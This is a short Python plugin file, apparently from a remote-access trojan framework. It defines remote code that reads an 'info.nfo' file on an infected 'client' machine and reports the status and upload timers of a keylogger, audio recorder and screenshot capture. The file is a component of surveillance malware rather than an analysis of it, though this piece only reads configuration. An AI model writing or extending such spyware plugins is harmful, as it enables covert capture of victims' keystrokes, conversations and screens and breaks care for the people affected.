plugin_name = 'getInfoValues'

plugin_description = 'Get Info About Client Info.nfo file'

r_source = r"""
values = open(os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo'), 'r').read()

val = ast.literal_eval(values)

mprint = '''
# KEYLOGGER
keylogger status = %s
keylogger upload timer = %s
# AUDIO RECORDING
audio status = %s
audio timer = %s
# SCREENSHOTS
screenshot status = %s
screenshot upload timer = %s
screenshot delay = %s
''' % (val['kts'],
	val['kt'],
	val['ats'],
	val['at'],
	val['sts'],
	val['st'],
	val['std'],)



"""

l_source = ''